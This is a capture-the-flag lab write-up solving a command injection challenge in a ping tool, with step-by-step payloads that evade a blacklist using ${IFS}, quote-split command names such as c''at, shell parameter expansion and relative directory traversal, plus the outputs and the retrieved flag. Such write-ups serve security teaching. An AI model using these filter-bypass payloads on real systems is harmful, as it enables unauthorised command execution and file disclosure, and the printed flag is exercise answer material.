# Task 2. Hack, laugh, uncover, win!

## **Task Description**

### Hacking our ping tool? Let's uncover secrets and flag victory!


Here's another step in our cyber adventure! Let's move forward and dive into the challenge ahead.

Despite our efforts, vulnerabilities may still lurk. Your mission? To test the tool's defenses, exploit its weaknesses, and uncover hidden flags.

Challenge

This challenge involves a tool that pings given hosts. The goal is to exploit a command injection vulnerability in the user-supplied domain. However, the application has blacklisted many commands and special characters, including spaces and slashes. To bypass the filter, you'll need to construct the path for the flag using the HOME environment variable.

Initial Endpoint:

`http://web0x09.hbtn/app3/`

Useful instructions:

1. Log into Asset Discovery tool.
2. ping is vulnerable.
3. We can try and give it an input (google.com for example).
4. To exploit this vulnerability, we need to use Bypass space, Bypass command check.
5. The flag is in /var/2-flag.txt
6. Path crafted with HOME bypasses filter.
7. Player supplied with source code.

Repo:

GitHub repository: dlh-cyber_security  \
Directory: web_application_security/0x09_command_injection \
File: 2-flag.txt


## **Solution**



- Start sandbox `cyber_websec_0x09`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.129.101 web0x09.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x09.hbtn
```


## **Task 2: Bypassing command, space, and slash filters**

**Target:** `http://web0x09.hbtn/app3/`\
**Flag location:** `/var/2-flag.txt`

This challenge adds another restriction: the `/` character is blacklisted.

We'll build on our successful Task 1 exploit, adding a technique to reconstruct `/` using the `HOME` environment variable.

### **Step 1: Test the HOME-based bypass**

Log into the application and enter this payload in the **Ping** input:

```
127.0.0.1;c''at${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt
```

### **How it works**

| Component     | Purpose                                              |
| ------------- | ---------------------------------------------------- |
| `127.0.0.1;`  | Ping target and command separator                    |
| `c''at`       | Bypasses a simple `cat` blacklist                    |
| `${IFS}`      | Substitutes shell whitespace                         |
| `${HOME:0:1}` | Extracts the first character of `HOME`, normally `/` |
| `var`         | Directory name                                       |
| `2-flag.txt`  | Target file                                          |

The crucial technique is `${HOME:0:1}`. In Bash, this extracts the first character of the `HOME` variable.

For example, if `HOME=/home/lab03`, it evaluates to `/`.

The intended command after shell expansion is:

```
cat /var/2-flag.txt
```

**Note:** This payload relies on Bash-style substring expansion. If the application uses a different shell, its error message will help us choose a compatible alternative.


**Output:**
```
/bin/sh: 1: Bad substitution
```

The error `/bin/sh: 1: Bad substitution` tells us the application is executing commands through `/bin/sh`, which doesn't support Bash's `${HOME:0:1}` syntax.

We need a **POSIX-compatible alternative**.

### **Step 2: Bypass the slash filter using POSIX parameter expansion**

Enter this payload:

```
127.0.0.1;c''at${IFS}${HOME%${HOME#?}}var${HOME%${HOME#?}}2-flag.txt
```

### **How it works**

The expression `${HOME%${HOME#?}}` extracts the first character of `HOME` without relying on Bash-specific substring syntax.

Assuming `HOME=/home/lab03`:

1. `${HOME#?}` removes the first character, producing `home/lab03`.
2. `${HOME%${HOME#?}}` removes that suffix from the original value, leaving `/`.
3. Repeating the expression constructs `/var/2-flag.txt`.

This gives us three bypasses:

| Restriction       | Bypass              |
| ----------------- | ------------------- |
| Spaces            | `${IFS}`            |
| Blacklisted `cat` | `c''at`             |
| Blacklisted `/`   | `${HOME%${HOME#?}}` |


**Output:**
```
Attack detected!
Your request has been blocked due to suspicious activity.
```

The application responded with **"Attack detected!"**, indicating that the new payload triggered its security filter.

Unlike the previous error, this response suggests the application rejected the input before shell execution.

Possible triggers include `#`, `?`, `%`, or nested parameter expansion.

### **Step 3: Inspect the HOME variable**

Before constructing another bypass, let's determine the actual value of `HOME`.

Enter:

```
127.0.0.1;echo${IFS}$HOME
```

**Why this test?**

- `echo` tests whether another basic command is allowed.
- `${IFS}` avoids literal spaces.
- `$HOME` reveals the directory stored in the environment variable.
- We avoid the additional characters that may have triggered the filter.

Knowing the value of `HOME` will help us construct `/var/2-flag.txt` without using literal slashes.

**Output:**
```
/home/lab03
```


Good. We've confirmed:

- `HOME=/home/lab03`
- Command injection still works.
- `${IFS}` bypasses space filtering.
- The previous parameter expansion triggered the security filter.

### **Step 4: Bypass slash filtering using directory traversal**

Instead of constructing `/` directly, we can navigate the filesystem using `cd` and `..`.

Enter this payload:

```
127.0.0.1;c''d${IFS}$HOME;c''d${IFS}..;c''d${IFS}..;c''d${IFS}var;c''at${IFS}2-flag.txt
```

**How it works:**

1. `cd $HOME` enters `/home/lab03`.
2. `cd ..` moves to `/home`.
3. `cd ..` moves to `/`.
4. `cd var` enters `/var`.
5. `cat 2-flag.txt` reads the target flag.

The payload uses `c''d` and `c''at` to evade simple command-name checks, while `${IFS}` replaces spaces.

**Key insight:** This avoids literal `/` characters entirely. It uses the known `HOME` location and relative directory navigation instead.

**Output:**
```
/bin/sh: 1: cd: can't cd to /home/lab03
/bin/sh: 1: cd: can't cd to var
cat: 2-flag.txt: No such file or directory
```

The output reveals an important detail: `HOME=/home/lab03`**&#x20;is defined, but that directory is not accessible.** Our directory traversal approach therefore failed.

We can avoid `cd` entirely by extracting `/` directly from `$HOME`.

### **Step 5: Construct the flag path using POSIX shell expansion**

Try this payload:

```
127.0.0.1;c''at${IFS}${HOME%%home*}var${HOME%%home*}2-flag.txt
```

**How it works:**

The expression `${HOME%%home*}` uses POSIX-compatible suffix removal.

Given `HOME=/home/lab03`:

- `${HOME%%home*}` removes `home/lab03`.
- The remaining character is `/`.
- Combining the expansions produces `/var/2-flag.txt`.

This avoids literal slashes, spaces, and the Bash-specific syntax that previously failed.


**Output:**
```
Attack detected!
Your request has been blocked due to suspicious activity.
```

The security filter is blocking our parameter-expansion attempts, likely because of characters such as `%` or `*`.

Let's change approach. We can use **relative directory navigation** to avoid constructing slashes altogether.

### **Step 6: Identify the current working directory**

Submit this payload:

```
127.0.0.1;p''wd
```

**Why this matters:**

Our previous `cd` attempt failed because `/home/lab03` doesn't appear to be accessible. But the application has its own working directory.

If we identify that directory, we can navigate toward `/var` using `..` without including any `/` characters.

**Output:**
```
/var/www/html/Lab03/app
```

Excellent. We now know the application's working directory:

```
/var/www/html/Lab03/app
```

This gives us a straightforward route to the flag without using any `/` characters.

### **Step 7: Navigate to&#x20;**`/var`**&#x20;and retrieve the flag**

From the current directory, we need to move up **four directory levels**:

```
/var/www/html/Lab03/app
                    ↑ 1
              Lab03 → html (2)
              html  → www  (3)
              www   → var  (4)
```

Submit this payload:

```
127.0.0.1;c''d${IFS}..;c''d${IFS}..;c''d${IFS}..;c''d${IFS}..;c''at${IFS}2-flag.txt
```

**What this accomplishes:**

- `c''d${IFS}..` moves up one directory.
- Repeating it four times reaches `/var`.
- `c''at${IFS}2-flag.txt` reads the flag using its relative filename.
- No literal slashes or spaces are needed.

Because the commands execute in the same shell, the directory changes persist across the semicolon-separated commands.


**Output:**
```
FLAG_2 1410622d69753defb64c6d9fe8abcaf8
```

&#x20;Task 2 completed

Successfully bypassed the command, space, and slash filters and retrieved the flag.

### **Flag obtained**

**FLAG_2**

&#x20;Copy

`1410622d69753defb64c6d9fe8abcaf8`

### **Successful payload**

```
127.0.0.1;c''d${IFS}..;c''d${IFS}..;c''d${IFS}..;c''d${IFS}..;c''at${IFS}2-flag.txt
```

### **Technical summary**

| Property                 | Result                              |
| ------------------------ | ----------------------------------- |
| Vulnerability            | OS Command Injection                |
| Target                   | `/app3/`                            |
| Space bypass             | `${IFS}`                            |
| Command blacklist bypass | `c''d`, `c''at`                     |
| Slash bypass             | Relative directory traversal (`..`) |
| Initial directory        | `/var/www/html/Lab03/app`           |
| Flag location            | `/var/2-flag.txt`                   |
| Outcome                  | Successful                          |

### **Key takeaway**

The application blocked several attempts at shell parameter expansion, but it still permitted command separators, environment-variable expansion, and relative directory traversal.

The decisive technique was **changing the shell's working directory instead of constructing an absolute path**.

This demonstrates why blacklist-based input filtering is not a reliable defense against command injection. The underlying vulnerability remains exploitable as long as user-controlled input is interpreted as shell syntax.


## Save the Flag

```bash
echo "1410622d69753defb64c6d9fe8abcaf8" > 2-flag.txt
git add .
git commit -m "2-flag.txt"
git push
```

